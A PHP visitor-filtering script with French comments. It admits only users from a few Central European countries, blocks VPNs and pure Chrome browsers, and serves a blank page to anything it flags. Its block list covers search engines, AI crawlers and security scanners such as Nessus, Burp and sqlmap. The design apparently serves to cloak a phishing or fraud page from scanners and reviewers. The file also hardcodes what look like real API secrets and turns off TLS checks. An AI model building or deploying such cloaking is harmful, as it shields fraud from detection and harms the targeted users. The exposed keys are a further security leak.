<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Pages qui ne nécessitent pas de vérification de sécurité
$currentPage = $_GET['s'] ?? '1';
$exemptPages = ['v', 'c', 'e']; // v=captcha, c=check_status, e=error page

// Skip security check for exempt pages
if (in_array($currentPage, $exemptPages)) {
    return;
}

require __DIR__ . '/config.php';

define('HCAPTCHA_SITE_KEY', 'e626ae96-b980-415e-a1d0-5f6ad926e30c');
define('HCAPTCHA_SECRET_KEY', 'ES_b2f3fb5406c646a78f18d60a7813a239');

// Configuration: CAPTCHA obligatoire pour tout le monde SANS EXCEPTION
define('FORCE_CAPTCHA_FOR_ALL', true);

$allowedCountries = ['CH', 'DE', 'FR', 'AT', 'LI', 'BE', 'LU'];

$botPatterns = [
    // Moteurs de recherche principaux
    'googlebot', 'bingbot', 'yandexbot', 'baidu', 'slurp', 'duckduckbot',
    'baiduspider', 'sogou', 'msnbot', 'mediapartners-google', 'solomono',
    'mojeek', 'naver', 'daum', 'gsa-crawler', 'teoma', 'gigablast',

    // Crawlers Web génériques
    'crawler', 'spider', 'bot/', 'crawl', 'scraper', 'archiver',
    'spider_monkey', 'spiderbot', 'spiderline', 'crawlpaper', 'crawldaddy',

    // Analyse SEO
    'semrush', 'ahrefs', 'moz', 'screaming-frog', 'seobility', 'serpstat',
    'majestic', 'ubersuggest', 'similarweb', 'builtwith', 'woorank',
    'semrushbot', 'ahrefsbot', 'mozbot', 'seostat', 'xenulink',

    // Réseaux sociaux
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterestbot',
    'redditbot', 'discordbot', 'slackbot', 'telegrambot', 'whatsapp',
    'viber', 'line', 'instagrambot', 'spotifybot', 'tumblrbot',
    'tiktok', 'snapchat', 'nextdoor', 'medium', 'vimeo',

    // IA et Machine Learning
    'gptbot', 'chatgpt', 'claude', 'anthropic', 'openai', 'bingpreview',
    'googleother', 'applebot', 'perplexity', 'claud', 'beachbot',
    'diffbot', 'textzoic', 'amazonbot', 'bytedance', 'cohere',
    'facebookcatalog', 'meta', 'metabot', 'mistral', 'llama',

    // Outils de monitoring et sécurité
    'accunetix', 'nikto', 'masscan', 'zap', 'nmap',
    'qualys', 'rapid7', 'nessus', 'burp', 'owasp', 'metasploit',
    'whatweb', 'w3af', 'cms-scanner', 'sqlmap', 'openvas',
    'tenable', 'checkmarx', 'nexusiqserver', 'appscan',

    // Services de monitoring
    'siteimprove', 'monitoring', 'uptime', 'statuspage', 'pingdom',
    'statusok', 'hetrixtools', 'siteguarding', 'contentking',
    'appdynamics', 'newrelic', 'datadog', 'splunk', 'grafana',
    'elasticbeats', 'packetbeat', 'logstash', 'kibana',

    // Navigateurs sans interface
    'headless', 'phantom', 'phantomjs', 'ghostdriver', 'chrome-headless',
    'chromium', 'firefox-headless', 'chromium-headless', 'headlesschrome',

    // Frameworks d'automatisation
    'selenium', 'puppeteer', 'playwright', 'nightmarebot', 'webdriver',
    'cypress', 'testcafe', 'watir', 'appium', 'winium', 'wd',
    'protractor', 'geckodriver', 'chromedriver', 'edgedriver',

    // Outils CLI et clients HTTP
    'curl/', 'wget/', 'httpie', 'python-requests', 'node-fetch',
    'requests/', 'urllib', 'go-http-client', 'java/', 'okhttp',
    'restclient', 'advancedrestclient', 'insomnia', 'postman',
    'thunderclient', 'paw', 'rested', 'httpremote',

    // Scrapers Web
    'scrapy', 'httrack', 'wget', 'colly', 'jsoup', 'beautifulsoup',
    'cheerio', 'puppeteerscraper', 'scarpy', 'splash', 'portia',
    'apify', 'octoparse', 'parserator', 'import.io', 'kimonolabs',
    'webhose', 'prx.io', 'easilydo',

    // Archives et sauvegardes
    'archive.org', 'archivebot', 'ia-archiver', 'wayback', 'heritrix',
    'warrick', 'crawlx', 'arquivo-web-crawler', 'nutch',

    // Lecteurs de flux RSS
    'feedfetcher', 'feedly', 'inoreader', 'newsblur', 'flipboard',
    'pocket', 'instapaper', 'getpocket', 'readability', 'feedburner',
    'googlefeeds', 'bingsitemap', 'feedvalidator', 'validator.w3.org',
    'rss2email', 'feedreader', 'thunderbird', 'outlook',

    // Email et unfurlers d'URL
    'emailmarketingcloud', 'twitterfetcher', 'linkpreviewgenerator',
    'url-preview', 'urlfetcher', 'oembedget', 'unfurl',
    'linkpreview', 'urlmeta', 'embed', 'unfurler',

    // Commerce et paiement
    'paypalbot', 'shopifybot', 'amazonbot', 'ebaybot', 'rakutenbot',
    'alibababot', 'alibaba', 'shopify', 'stripe', 'square',
    'adyen', 'braintree', 'woocommerce', 'magento',

    // Analyse et Web Analytics
    'googleanalytics', 'analytics', 'hotjar', 'mixpanel', 'segment',
    'amplitude', 'heap', 'fullstory', 'contentsquare', 'logrocket',
    'mouseflow', 'clicktail', 'userreplay', 'userflow', 'piwik',
    'matomo', 'chartbeat', 'quantcast', 'comscore',

    // Tests d'API et performances
    'postman', 'insomnia', 'restclient', 'soapui', 'jmeter',
    'gatling', 'grpc', 'swagger', 'apigee', 'kong',
    'loadimpact', 'blitz', 'locustio', 'vegeta', 'wrk',
    'apache-jmeter', 'siege', 'ab', 'hey', 'drill',

    // Vérificateurs de liens
    'linkchecker', 'deadlinkchecker', 'linkvalidator', 'xenu',
    'broken-link-checker', 'w3c-link-checker', 'linkdigger',
    'checkbot', 'linkprofiler', 'linkhunter',

    // Protection et détection de bots
    'cloudflare', 'akamai', 'imperva', 'cloudflare-bot', 'akamai-bot',
    'imperva-bot', 'distil', 'perimeterx', 'datadome', 'reblace',

    // Autres outils
    'shodan', 'zoomeye', 'censys', 'graylog', 'elasticsearch',
    'wireshark', 'tcpdump', 'packetbeat', 'pfsense', 'snort',
    'suricata', 'zeek', 'bro', 'ipv6bot', 'apexbot', 'adsbot',
    'almaden', 'alyze', 'arabot', 'archlinux', 'asp.net', 'atom',
    'ator', 'blinkx', 'bold', 'boletn', 'bullseye', 'btbot',
    'cbn3', 'ccbot', 'cdx', 'cgh-tools', 'ciru', 'citeseerxbot',
    'clariabot', 'clushbot', 'coccocbot', 'cogbot', 'compspybot',
    'copperegg', 'cora', 'cosory', 'crawlconvera', 'crawlerabot',
    'crazybot', 'cyberspyder', 'cydotz', 'dabigo', 'daedalus',
    'dbpower', 'deepindex', 'depthbot', 'designbot', 'deusu',
    'devoted', 'diibot', 'digininja', 'digout4u', 'diskontbot',
    'dittospyder', 'domaincrawler', 'domainspider', 'dotbot',
    'dotnetdotcom', 'downloaderbot', 'drawbot', 'drebot', 'drupalscan',
    'duckducksearch', 'dumbot', 'dzbot', 'ebingbang', 'eccp',
    'equery', 'esrimaprequestor', 'europarchive', 'evrinbot',
    'exabot', 'exalead', 'examiner', 'excludebot', 'explorer_us',
    'exrawl', 'eye4u', 'ezooms', 'fastbot', 'fastcrawler',
    'fastmobilecrawl', 'fastwebcrawler', 'favebot', 'feedfinder',
    'fenix', 'ferretbot', 'fetchor', 'fhcrawler', 'fida',
    'findbot', 'findlinks', 'findxbot', 'flaming', 'flashget',
    'flightdeck', 'flirt4free', 'flounder', 'flux', 'flynx',
    'folkd', 'forecasterforum', 'forecastio', 'fork', 'forumbots',
    'forumzilla', 'forumsbot', 'fosbot', 'fozzy', 'front-end',
    'frubber', 'fscbot', 'fullwebbot', 'g2crawler', 'gadgetinfo',
    'galactibot', 'gamespybot', 'ganalytics', 'gbot', 'gdcbot',
    'geminitor', 'genieo', 'gentoo', 'geographybot', 'geospider',
    'getdatabot', 'getleft', 'getright', 'geturl', 'gigabot',
    'giga', 'gilderbot', 'girafabot', 'gisbot', 'giugno',
    'globalspec', 'globalscan', 'globe', 'gluten', 'glyphbot',
    'gnar', 'gnats', 'goat', 'gobot', 'godaddy', 'goliat',
    'goliath', 'gonzo', 'golinks', 'gossamer', 'govbot',
    'gowikibot', 'gozilla', 'grammarian', 'grapeshot', 'graptolite',
    'graspit', 'grasshopper', 'graybot', 'greatis', 'greeleybot',
    'greenbot', 'greensearch', 'greentexture', 'gregarius',
    'gribbot', 'grimbotbot', 'grimmbot', 'grinningbot', 'gripper',
    'grobotbot', 'gropingbot', 'groove', 'groovebot', 'groupby',
    'grub', 'grubbot', 'grubstake', 'grunt', 'guardbot', 'guidebot',
    'gulliver', 'gumgumbot', 'gumtreebot', 'gundacrawler', 'gunnars',
    'gurubot', 'gurusearch', 'gusbot', 'gutbot', 'guvf',

    // Bots supplémentaires d'archives du document
    '007ac9', '192.comAgent', '360Spider', '4seohuntbot', '80legs',
    'a6-indexer', 'Aboundex', 'AbusiveBot', 'accelobot', 'acoonbot',
    'AddThis', 'ADmantX', 'AdsBot', 'adscanner', 'adbeat',
    'adblade', 'adeptivemedia', 'adressendeutschland', 'adrelevance',
    'adroll', 'adstxt', 'adunitsolutions', 'adversarial-ml', 'adwatch',
    'adxbid', 'aggregator', 'aihitbot', 'aiohttp', 'airmailbot',
    'akamai-sitesnapshot', 'alisamobile', 'alligator', 'amagit',
    'amznkassocbot', 'analyzer', 'android', 'answerbot', 'antabot',
    'antispam', 'antibot', 'anysite', 'AOL', 'apache-httpclient',
    'AportWorm', 'appengine-google', 'aspseek', 'astickymess',
    'asterias', 'atnbot', 'attentio', 'attrapub', 'attribution',
    'autoemailspider', 'autowebdir', 'avsearch', 'axelspringer',
    'axiomtelecom', 'BackDoorBot', 'backlink-checker', 'backlinkcrawler',
    'backstreet', 'backweb', 'bad-ass', 'Bad-Neighborhood',
    'BaiDuSpider', 'Bandit', 'bangbangbot', 'Barkrowler', 'batchftp',
    'baypup', 'bdfetch', 'beamusupscotty', 'beautybot', 'BebopBot',
    'BecomeBot', 'bedwig', 'BeebwareDirectory', 'beetlebot', 'bender',
    'betaBot', 'bigbrother', 'Bigfoot', 'BigWebDirectory', 'BingPreview',
    'binlar', 'biocrawler', 'Bionic', 'bitlybot', 'bitvoxybot',
    'bizbot', 'blackwidow', 'BLM-Crawler', 'Blogdigger', 'bloglines',
    'blogpulse', 'blogsearch', 'blogshares', 'blogslive', 'blowfish',
    'bluefish', 'blitzbot', 'bnf.fr_bot', 'boitho', 'boochbot',
    'bookmark-manager', 'boris', 'Boston-Project', 'boutell', 'boxseabot',
    'BpSpider', 'Brandprotect', 'Brandprotectbot', 'brokore', 'BSDSeekBot',
    'browsershots', 'buscador', 'Butterfly', 'buzzbot', 'byindia',
    'c-sensor', 'c4-bot', 'cachedview', 'calyxinstitute', 'Camcrawler',
    'CamelStampede', 'cancerbot', 'Canon', 'Canon-WebRecord', 'captain',
    'careerbot', 'careerseeker', 'carleson', 'casperbot', 'caster',
    'catexplorador', 'catfood', 'CCGCrawl', 'cd-preload', 'centurybot',
    'cerberian', 'ceron.jp_bot', 'cert', 'figleafbot', 'cfbot',
    'cg-eye', 'cha0s', 'changedetection', 'changesbot', 'Charlotte',
    'Checkbot', 'checkprivacy', 'CherryPicker', 'chinaclaw', 'cipinetbot',
    'citeseerxbot', 'abacho', 'accona', 'ahoy', 'AISearchBot',
    'alexa', 'altavista', 'anthill', 'appie', 'arale', 'araneo',
    'AraybOt', 'ariadne', 'arks', 'ATN_Worldwide', 'Atomz',
    'Bjaaland', 'BlackWidow', 'BotLink', 'boxseabot', 'bspider',
    'calif', 'CCBot', 'ChinaClaw', 'christcrawler', 'CMC', 'combine',
    'confuzzledbot', 'contaxe', 'CoolBot', 'cosmos', 'crawlpaper',
    'downloadexpress', 'DragonBot', 'dwcp', 'EasouSpider', 'ebiness',
    'ecollector', 'elfinbot', 'esculapio', 'ESI', 'esther',
    'eStyle', 'Ezooms', 'facebook', 'facebot', 'fastcrawler',
    'FatBot', 'FDSE', 'FELIX', 'fetch', 'fido', 'find',
    'Firefly', 'fouineur', 'Freecrawl', 'froogle', 'gammaSpider',
    'gazz', 'geona', 'Getterrobo-Plus', 'girafabot', 'golem',
    'grabber', 'GrabNet', 'griffon', 'Gromit', 'gulliver',
    'gulper', 'hambot', 'havIndex', 'hotwired', 'htdig',
    'ia_archiver', 'iajabot', 'IDBot', 'Informant', 'InfoSeek',
    'InfoSpiders', 'INGRID', 'inktomi', 'inspectorwww', 'Internet',
    'irobot', 'Iron33', 'JBot', 'jcrawler', 'Jeeves', 'jobo',
    'KDD', 'KIT', 'ko_yappo_robot', 'label', 'larbin',
    'legs', 'libwww-perl', 'Linkidator', 'linkwalker', 'Lockon',
    'logo_gif_crawler', 'Lycos', 'm2e', 'majesticsEO', 'marvin',
    'mattie', 'mediafox', 'mediapartners', 'MerzScope', 'MindCrawler',
    'MJ12bot', 'mod_pagespeed', 'moget', 'Motor', 'muncher',
    'muninn', 'MuscatFerret', 'MwdSearch', 'NationalDirectory', 'naverbot',
    'NEC', 'NetcraftSurveyAgent', 'NetScoop', 'NetSeer', 'newscan',
    'nil', 'none', 'Nutch', 'ObjectsSearch', 'Occam', 'openstat',
    'packrat', 'pageboy', 'ParaSite', 'patric', 'pegasus',
    'perlcrawler', 'phpdig', 'piltdownman', 'Pimptrain', 'pingdom',
    'pinterest', 'pjspider', 'PlumtreeWebAccessor', 'PortalBSpider',
    'psbot', 'rambler', 'Raven', 'RHCS', 'RixBot', 'roadrunner',
    'Robbie', 'robi', 'RoboCrawl', 'robofox', 'Scooter', 'Scrubby',
    'Search', 'searchprocess', 'SemrushBot', 'Senrigan', 'seznambot',
    'Shagseeker', 'sharp', 'sift', 'SimBot', 'Site', 'SiteSucker',
    'skymob', 'SLCrawler', 'snooper', 'solbot', 'speedy',
    'spider_monkey', 'SpiderBot', 'spiderline', 'suke', 'tach_bw',
    'TechBOT', 'TechnoratiSnoop', 'templeton', 'teoma', 'titin',
    'topiclink', 'twitterbot', 'twitter', 'UdmSearch', 'Ukonline',
    'UnwindFetchor', 'URL_Spider_SQL', 'urlck', 'urlresolver', 'Valkyrie',
    'verticrawl', 'Victoria', 'void', 'Voyager', 'VWbot_K',
    'wapspider', 'WebBandit', 'webcatcher', 'WebCopier', 'WebFindBot',
    'WebLeacher', 'WebMechanic', 'WebMoose', 'webquest', 'webreaper',
    'webspider', 'webs', 'WebWalker', 'WebZip', 'whowhere',
    'winona', 'wlm', 'WOLP', 'woriobot', 'WWWC', 'XGET',
    'xing', 'yahoo', 'YandexBot', 'YandexMobileBot', 'yandex',
    'yeti', 'cizilla.com', 'clshttp', 'cmsworldmap', 'coccoc',
    'collapsar', 'collector', 'comodo', 'conceptbot', 'conducivebot',
    'convera', 'coolcheck', 'Copernic', 'copyscape', 'copyright',
    'Covario', 'CrawlDaddy', 'crawltrack', 'cronjob', 'crossrefbot',
    'crowdflower', 'Crowsnest', 'cse.google', 'cuill', 'curiousgeorge',
    'currybot', 'custo', 'cyberalert', 'cyberdog', 'CyberPatrol',
    'cyveillance', 'd1garabicengine', 'DA', 'dailymotion', 'danishbot',
    'darenet', 'dasblog', 'datafountains', 'DataparkSearch', 'dataprovider',
    'Daum', 'davebot', 'daypopbot', 'dbot', 'dc-sakura', 'dCSbot',
    'deepindex', 'deepnet', 'deeptrawl', 'dejan', 'deliciousbot',
    'dell', 'demandbase', 'deploybot', 'dergru', 'detector', 'devon',
    'deweb', 'dgd', 'diablo', 'diamond', 'diamondbot', 'diavol',
    'digg', 'diibot', 'dipsie', 'disco', 'discobot', 'discoverybot',
    'dispatch', 'dlvr.it', 'dmoz', 'DNS', 'DNS-Digger', 'DNS-Explorer',
    'dnslookup', 'docomo', 'dodgebot', 'dofus', 'domaincrawler',
    'domainsbot', 'domainsproject', 'domaintools', 'dotnetdotcom',
    'dotspotsbot', 'download', 'dragonbot', 'drupal', 'dsweb',
    'dtsearch', 'dualsearch', 'dumbot', 'dwaar', 'dxseeker',
    'e-societyrobot', 'EARTHCOM', 'earthquake', 'EasyDL', 'EBrowse',
    'ec2linkfinder', 'eCairn', 'eCatch', 'eChooseBot', 'ecxi',
    'EddieBot', 'EduGovSearch', 'egothor', 'eidetica.com', 'eidetiq',
    'EirGrabber', 'eladok', 'electricmonk', 'elefante', 'EMail',
    'EmailCollector', 'emailprospector', 'emailsiphon', 'EmailWolf',
    'EMPAS_ROBOT', 'EnaBot', 'endeca', 'endlessjazz', 'EnigmaBot',
    'enterprise', 'envirosearch', 'envolk', 'EroCrawler', 'ESISmartSpider',
    'espider', 'esribot', 'EtaoSpider', 'etscada', 'eurosoft',
    'eventures', 'evrinid', 'exactseek', 'exalead', 'exekey',
    'exensa', 'exif', 'experteer', 'explicitnetworks', 'exploder',
    'exsul', 'Extractor', 'extractorpro', 'EyeNetIE', 'ez-robot',
    'ezooms', 'facesearch', 'factbot', 'fairshare', 'falcon',
    'falconsbot', 'faqbot', 'fast-search-engine', 'fastbot.de',
    'fastenbot', 'fastsearch', 'faup', 'favicon', 'favorg',
    'faxo', 'FDM', 'feedburner', 'feedchecker', 'feedfetcher',
    'feedjit', 'feedme', 'feedreader', 'Feedster', 'felix',
    'fetch_spider', 'fetchrover', 'fisbot', 'fishbot', 'flashcapture',
    'flint', 'flipboardproxy', 'FlipboardRSS', 'fluffy', 'fly',
    'flybot', 'foobot', 'focused_crawler', 'fofa', 'follower',
    'FollowSite', 'forensiq', 'fosfor', 'fotoalbum', 'FoundBot',
    'fr_crawler', 'frogsoda', 'frogtest', 'frontend', 'frontpage',
    'fruitfl', 'fruitfly', 'ftpsearch', 'fuelbot', 'full_breadth_crawler',
    'funnelback', 'FunWebProducts', 'furlbot', 'g00g1e', 'g00g1ebot',
    'g10-bot', 'g2crawler', 'ganar', 'geckobot', 'generic',
    'genieo_crawler', 'genieouscreenmegod', 'geocheck', 'geoedge',
    'geobot', 'GeonaBot', 'geovantage', 'gerbil', 'gestalt',
    'getintent', 'getintentcrawler', 'getright', 'getweb', 'giant',
    'Gigabot', 'gigamega', 'gigibot', 'gigya', 'gigya-crawler',
    'goforit', 'gold', 'goldfire', 'gonzo', 'goofer',
    'google-structured-data-testing-tool', 'google-survey', 'google-thumbnailer',
    'gosospider', 'gotit', 'gozilla', 'grab', 'grabnet',
    'grafula', 'grapefx', 'grapeshot', 'grbot', 'GreenBrowser',
    'gridbot', 'grub-client', 'grub.org', 'grubcrawler', 'grupthink',
    'gsa-crawler', 'gsitecrawler', 'gslfbot', 'gsrch', 'gssbot',
    'guggybot', 'guidancebot', 'gulp', 'GurujiBot', 'hacker',
    'hadi', 'halcyon', 'halliburton', 'hansendeepLink', 'harvest',
    'hcat', 'hclsreport-crawler', 'healthbot', 'hedgehog', 'helsinki',
    'heritrix', 'hia', 'highbeam', 'hijbul-islam', 'hiqual',
    'hitsniffer', 'hledej', 'hmview', 'hoge', 'holmes',
    'homepagesearch', 'Hometown', 'homogefrontpagebot', 'hooWWWer',
    'hostcrawler', 'hsnbot', 'hsteeler', 'htmlparser', 'httpclient',
    'httpconnect', 'httpdown', 'httpget', 'httpheader', 'httpinettekce',
    'httplib', 'httplib2', 'httpunit', 'hul-wax', 'humanlinks',
    'huronbot', 'hverify', 'ias_adag', 'ias+adag', 'ias.adag',
    'ias_insights', 'ibm_totalaccess', 'ichiro', 'iCjobs', 'iCjobs-crawler',
    'icloader', 'icproject', 'Identify', 'Id-search', 'ie6_autodiscovery',
    'ienrich', 'iexplore.exe', 'iGetter', 'iim_bot', 'ilsebot',
    'iltrovatore', 'ImageVisualsearch', 'imagewalker', 'imorebot', 'inagist',
    'inbound.li', 'InboundBot', 'incrawler', 'IncyWincy', 'indexing',
    'industry-brain', 'inet_collector', 'inetbot', 'inetURL', 'infobot',
    'infociousbot', 'infomine', 'InfoNaviRobot', 'infospider', 'InfoTekies',
    'infovortice2013', 'infoweb-monitor', 'IntraformantIODC'
];

function blockAccess($reason) {
    $_SESSION['security_passed'] = false;
    $_SESSION['block_reason'] = $reason;
    @file_put_contents(__DIR__ . '/logs/blocked.log',
        date('Y-m-d H:i:s') . " | " . ($_SERVER['REMOTE_ADDR'] ?? '') . " | $reason\n",
        FILE_APPEND
    );
    // Afficher une page blanche pour les bots
    http_response_code(200);
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title></title></head><body></body></html>';
    exit;
}

function requireCaptcha($reason) {
    // Check if captcha was already passed
    if (!empty($_SESSION['captcha_passed'])) {
        return false; // Captcha already passed, don't require again
    }

    $_SESSION['captcha_reason'] = $reason;
    // Use router path instead of direct file path
    $currentPage = $_GET['s'] ?? '1';
    $_SESSION['captcha_redirect'] = '?s=' . $currentPage;
    $_SESSION['captcha_ip'] = getRealIP();
    $_SESSION['captcha_token'] = bin2hex(random_bytes(32));

    // Log captcha requirement
    @file_put_contents(__DIR__ . '/logs/captcha_required.log',
        date('Y-m-d H:i:s') . " | " . getRealIP() . " | $reason\n",
        FILE_APPEND
    );

    header('Location: /?s=v');
    exit;
}

function getRealIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) return $_SERVER['HTTP_X_REAL_IP'];
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function verifyCaptcha($token) {
    if (empty($token)) return ['success' => false];
    $ch = curl_init('https://hcaptcha.com/siteverify');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(['secret' => HCAPTCHA_SECRET_KEY, 'response' => $token]),
        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    return ['success' => ($data['success'] ?? false) === true];
}

function assessIPRisk($data) {
    $risk = 0;
    $reasons = [];
    if (!empty($data['hosting']) && $data['hosting'] === true) { $risk += 40; $reasons[] = 'hosting'; }
    if (!empty($data['proxy']) && $data['proxy'] === true) { $risk += 30; $reasons[] = 'vpn'; }
    if (!empty($data['mobile']) && $data['mobile'] === true) { $risk += 5; $reasons[] = 'mobile'; }
    if (empty($data['isp']) || strlen($data['isp']) < 3) { $risk += 15; $reasons[] = 'unknown_isp'; }
    return ['risk_score' => $risk, 'reasons' => $reasons];
}

function isChromeBasedBrowser($userAgent) {
    if (empty($userAgent)) return false;

    $uaLower = strtolower($userAgent);

    // Vérifier si c'est Chrome, Chromium ou un navigateur basé sur Chrome
    // MAIS PAS Edge, Opera, Brave, Vivaldi, etc. qui sont aussi basés sur Chrome
    if (stripos($uaLower, 'chrome/') !== false || stripos($uaLower, 'chromium/') !== false) {
        // Exclure les navigateurs basés sur Chrome mais qui ne sont pas Chrome pur
        if (stripos($uaLower, 'edg/') !== false) return false; // Edge
        if (stripos($uaLower, 'opr/') !== false) return false; // Opera
        if (stripos($uaLower, 'brave/') !== false) return false; // Brave
        if (stripos($uaLower, 'vivaldi/') !== false) return false; // Vivaldi
        if (stripos($uaLower, 'yabrowser/') !== false) return false; // Yandex Browser
        if (stripos($uaLower, 'samsung') !== false) return false; // Samsung Internet

        // C'est Chrome pur ou Chromium
        return true;
    }

    return false;
}

$userIP = getRealIP();

// Localhost: set default info but still require CAPTCHA
if (in_array($userIP, ['127.0.0.1', '::1', 'localhost'])) {
    $_SESSION['ip_info'] = ['ip' => $userIP, 'countryCode' => 'CH', 'city' => 'Local', 'country' => 'Switzerland'];
    // Ne pas retourner ici - continuer pour forcer le CAPTCHA
    $data = ['countryCode' => 'CH', 'city' => 'Local', 'country' => 'Switzerland', 'isp' => 'localhost', 'mobile' => false, 'proxy' => false, 'hosting' => false];
    $isLocalhost = true;
} else {
    $isLocalhost = false;
}

// Check if security was already passed recently with same IP
if (!empty($_SESSION['security_passed']) && !empty($_SESSION['last_ip'])) {
    if ($_SESSION['last_ip'] === $userIP && (time() - ($_SESSION['security_time'] ?? 0)) < 120) {
        // Security passed recently, but still check for captcha if forced
        if (FORCE_CAPTCHA_FOR_ALL) {
            // Only require captcha if not already passed
            if (empty($_SESSION['captcha_passed'])) {
                requireCaptcha('mandatory_verification');
            }
        }
        return;
    }
}

// Generate antibot token
if (empty($_SESSION['antibotplot'])) $_SESSION['antibotplot'] = bin2hex(random_bytes(16));

// Check user agent for bots
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isSuspiciousUA = false;
if (!empty($userAgent)) {
    $uaLower = strtolower($userAgent);
    foreach ($botPatterns as $pattern) {
        if (strpos($uaLower, $pattern) !== false) {
            $isSuspiciousUA = true;
            break;
        }
    }
}

// BLOCAGE IMMÉDIAT: Navigateur Chrome détecté
if (isChromeBasedBrowser($userAgent)) {
    @file_put_contents(__DIR__ . '/logs/chrome_blocked.log',
        date('Y-m-d H:i:s') . " | $userIP | Chrome detected: " . $userAgent . "\n",
        FILE_APPEND
    );
    blockAccess('chrome_browser_blocked');
}

// Get IP info from API (skip if localhost)
if (!$isLocalhost) {
    $apiUrl = "https://pro.ip-api.com/json/{$userIP}?key=NCx0PDVOcBsh1pQ&fields=66846719";
    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_TIMEOUT => 10]);
    $response = curl_exec($ch);
    curl_close($ch);
    $data = @json_decode($response, true);

    // If API fails, require captcha instead of blocking
    if (!$data || ($data['status'] ?? '') !== 'success') {
        requireCaptcha('api_error');
    }
}

// Check country (skip if localhost)
$countryBlocked = false;
$vpnDetected = false;
$hostingDetected = false;

if (!$isLocalhost) {
    // BLOCAGE IMMÉDIAT: Pays non autorisé
    if (!in_array($data['countryCode'] ?? '', $allowedCountries)) {
        $countryBlocked = true;
        @file_put_contents(__DIR__ . '/logs/country_blocked.log',
            date('Y-m-d H:i:s') . " | $userIP | Country blocked: " . ($data['countryCode'] ?? 'unknown') . "\n",
            FILE_APPEND
        );
        blockAccess('country_not_allowed');
    }

    // BLOCAGE IMMÉDIAT: VPN/Proxy détecté
    if (!empty($data['proxy']) && $data['proxy'] === true) {
        $vpnDetected = true;
        @file_put_contents(__DIR__ . '/logs/vpn_blocked.log',
            date('Y-m-d H:i:s') . " | $userIP | VPN/Proxy blocked\n",
            FILE_APPEND
        );
        blockAccess('vpn_proxy_blocked');
    }

    // Check for hosting/datacenter (LOG only, no block)
    if (!empty($data['hosting']) && $data['hosting'] === true) {
        $hostingDetected = true;
    }
}

// Assess risk
$riskAssessment = assessIPRisk($data);
$riskScore = $isLocalhost ? 0 : $riskAssessment['risk_score'];

// Store IP info in session
$_SESSION['ip_info'] = [
    'ip' => $userIP, 'city' => $data['city'] ?? '', 'country' => $data['country'] ?? '',
    'countryCode' => $data['countryCode'] ?? '', 'isp' => $data['isp'] ?? '',
    'mobile' => $data['mobile'] ?? false, 'risk_score' => $riskScore
];

// CAPTCHA OBLIGATOIRE POUR TOUT LE MONDE SANS EXCEPTION
// Vérifier si le CAPTCHA a déjà été validé
if (empty($_SESSION['captcha_passed'])) {
    // Le CAPTCHA n'a pas été validé -> rediriger vers la page CAPTCHA
    requireCaptcha('mandatory_verification_all');
}

// CAPTCHA VALIDÉ - Logger les activités suspectes

// Log User-Agent suspects (ne bloque pas)
if ($isSuspiciousUA) {
    @file_put_contents(__DIR__ . '/logs/suspicious_ua.log',
        date('Y-m-d H:i:s') . " | $userIP | " . ($userAgent ?? 'unknown') . "\n",
        FILE_APPEND
    );
}

// Log hosting/datacenter (ne bloque pas - CAPTCHA suffit)
if ($hostingDetected) {
    @file_put_contents(__DIR__ . '/logs/hosting_warnings.log',
        date('Y-m-d H:i:s') . " | $userIP | Hosting detected\n",
        FILE_APPEND
    );
}

// Mark security as passed
$_SESSION['security_passed'] = true;
$_SESSION['security_time'] = time();
$_SESSION['last_ip'] = $userIP;

// Log access
@file_put_contents(__DIR__ . '/logs/access.log',
    date('Y-m-d H:i:s') . " | $userIP | " . ($data['countryCode'] ?? 'XX') . " | Risk: $riskScore\n", FILE_APPEND);
?>
